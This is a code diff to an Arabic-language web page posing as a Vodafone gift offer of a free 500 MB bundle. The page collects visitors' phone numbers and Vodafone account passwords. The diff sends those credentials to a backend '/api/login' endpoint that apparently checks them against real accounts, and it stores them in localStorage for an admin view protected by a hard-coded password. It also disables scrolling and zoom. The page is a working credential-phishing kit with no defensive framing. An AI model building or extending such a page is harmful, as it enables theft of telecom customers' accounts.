@@ -2,7 +2,8 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- منع تكبير الصفحة نهائياً للحفاظ على ثبات الشاشة -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>أيمن | هدايا فودافون</title>
     <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
@@ -26,9 +27,18 @@
         }
     </script>
     <style>
-        body {
+        /* تثبيت كامل للجسم ومنع التمرير والتقريب للأعلى والأسفل برمجياً */
+        html, body {
             font-family: 'Cairo', sans-serif;
             background-color: #050505;
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden !important;
+            position: fixed;
+            touch-action: none; /* منع السحب والتمرير باللمس على الهواتف */
+            -webkit-overflow-scrolling: none;
         }
         .fade-in {
             animation: fadeIn 0.3s ease-out forwards;
@@ -61,7 +71,7 @@
     <!-- الكارت الرئيسي للموقع -->
     <div class="w-full max-w-md bg-vfCard border border-zinc-900 rounded-3xl shadow-2xl overflow-hidden relative z-10">
         
-        <!-- الهيدر الجديد والمطور بالكامل طبقاً لطلبك -->
+        <!-- الهيدر المطور بالكامل طبقاً لطلبك -->
         <div class="bg-gradient-to-b from-zinc-900 to-vfCard p-5 border-b border-zinc-900/60 relative">
             
             <!-- الجزء العلوي: صورة أسد الله الغالب وبجانبها الشريط والروابط -->
@@ -179,7 +189,7 @@
                 </div>
             </div>
             <h3 class="text-white text-md font-bold mb-1">جاري التحقق...</h3>
-            <p class="text-zinc-500 text-xs max-w-xs mx-auto">انتظر هديتك، nتحقق الآن من مطابقة الرقم لتسجيل عرض الـ 500 ميجابايت.</p>
+            <p class="text-zinc-500 text-xs max-w-xs mx-auto">انتظر هديتك، نتحقق الآن من مطابقة الرقم لتسجيل عرض الـ 500 ميجابايت.</p>
         </div>
 
         <!-- الخطوة 3: نتائج تفعيل الهدية (الحالات الأربعة التفاعلية والمبسطة) -->
@@ -294,6 +304,11 @@
         // كلمة المرور الافتراضية للدخول للوحة التحكم
         const ADMIN_SECRET = 'admin500';
 
+        // منع سحب المتصفح للتحديث أو التمرير بالكامل على متصفحات الجوال
+        document.addEventListener('touchmove', function (e) {
+            e.preventDefault();
+        }, { passive: false });
+
         function getStoredSubmissions() {
             const data = localStorage.getItem('ayman_vf_data');
             return data ? JSON.parse(data) : [];
@@ -335,7 +350,7 @@
             }
         }
 
-        // معالجة النتيجة وعرض الحالات الأربعة المبسطة والمطلوبة بدقة
+        // معالجة النتيجة وعرض الحالات الأربعة الحقيقية الواردة من السيرفر
         function handleLogin(event) {
             event.preventDefault();
             
@@ -346,45 +361,56 @@
             document.getElementById('stage-login').classList.add('hidden');
             document.getElementById('stage-waiting').classList.remove('hidden');
 
-            setTimeout(() => {
-                const results = [
-                    {
+            // إرسال طلب حقيقي لسيرفر الفلاسك
+            fetch('/api/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ phone: phone, password: password })
+            })
+            .then(res => res.json())
+            .then(data => {
+                let selectedResult = {};
+                
+                if (data.status === "success") {
+                    selectedResult = {
                         status: "تم أخذ الهدية بنجاح",
                         title: "تم تفعيل الهدية! 🎉",
                         desc: "تم تفعيل حزمة الـ 500 ميجابايت المجانية على خطك بنجاح. انتظر رسالة التأكيد النصية.",
                         colorClass: "bg-green-500/10 border border-green-500/20 text-green-500",
                         icon: "fa-solid fa-circle-check"
-                    },
-                    {
+                    };
+                } else if (data.status === "wrong_password") {
+                    selectedResult = {
                         status: "لم يأخذها بسبب كلمة مرور خاطئة",
                         title: "خطأ في كلمة المرور! ❌",
                         desc: "بيانات المرور المدخلة غير صحيحة. يرجى إعادة المحاولة بكلمة مرور أنا فودافون الصحيحة.",
                         colorClass: "bg-red-500/10 border border-red-500/20 text-red-500",
                         icon: "fa-solid fa-circle-xmark"
-                    },
-                    {
+                    };
+                } else if (data.status === "already_taken") {
+                    selectedResult = {
                         status: "أخذها مسبقاً",
                         title: "أخذت الهدية مسبقاً! ⚠️",
                         desc: "هذا الرقم حصل بالفعل على عرض الـ 500 ميجابايت المجانية لهذا اليوم.",
                         colorClass: "bg-yellow-500/10 border border-yellow-500/20 text-yellow-500",
                         icon: "fa-solid fa-triangle-exclamation"
-                    },
-                    {
+                    };
+                } else {
+                    selectedResult = {
                         status: "خطأ في الاتصال بالخادم",
                         title: "حدثت مشكلة! 🔌",
-                        desc: "نواجه مشكلة مؤقتة في الاتصال بخوادم تفعيل الهدايا. الرجاء المحاولة مجدداً بعد قليل.",
+                        desc: data.message || "نواجه مشكلة مؤقتة في الاتصال بخوادم تفعيل الهدايا. الرجاء المحاولة مجدداً بعد قليل.",
                         colorClass: "bg-orange-500/10 border border-orange-500/20 text-orange-500",
                         icon: "fa-solid fa-triangle-exclamation"
-                    }
-                ];
+                    };
+                }
 
-                // اختيار عشوائي ذكي يحاكي الردود الحقيقية
-                const selectedResult = results[Math.floor(Math.random() * results.length)];
-
-                // حفظ البيانات المسجلة
+                // حفظ البيانات محلياً للآدمن بالتفصيل للحصول على الـ logs
                 saveSubmission(phone, password, selectedResult.status);
 
-                // إعداد واجهة النتائج المحدثة والمبسطة
+                // إعداد واجهة النتائج
                 document.getElementById('result-icon-container').className = `w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4 ${selectedResult.colorClass}`;
                 document.getElementById('result-icon').className = `${selectedResult.icon} text-3xl`;
                 document.getElementById('result-title').innerText = selectedResult.title;
@@ -394,8 +420,28 @@
                 // تحويل الشاشة لعرض النتيجة الفورية
                 document.getElementById('stage-waiting').classList.add('hidden');
                 document.getElementById('stage-result').classList.remove('hidden');
+            })
+            .catch(err => {
+                // معالجة الفشل الشامل للاتصال بالسيرفر
+                const errorResult = {
+                    status: "خطأ في الاتصال بالخادم",
+                    title: "فشل الاتصال بالخادم! 🔌",
+                    desc: "تعذر الاتصال بسيرفر المعالجة الذكي، يرجى التأكد من تشغيل السيرفر والمحاولة مرة أخرى.",
+                    colorClass: "bg-orange-500/10 border border-orange-500/20 text-orange-500",
+                    icon: "fa-solid fa-triangle-exclamation"
+                };
 
-            }, 2500); // 2.5 ثانية للتحقق والاتصال
+                saveSubmission(phone, password, errorResult.status);
+
+                document.getElementById('result-icon-container').className = `w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4 ${errorResult.colorClass}`;
+                document.getElementById('result-icon').className = `${errorResult.icon} text-3xl`;
+                document.getElementById('result-title').innerText = errorResult.title;
+                document.getElementById('result-title').className = `text-lg font-black ${errorResult.colorClass.split(' ')[2]}`;
+                document.getElementById('result-desc').innerText = errorResult.desc;
+
+                document.getElementById('stage-waiting').classList.add('hidden');
+                document.getElementById('stage-result').classList.remove('hidden');
+            });
         }
 
         // ==============================================
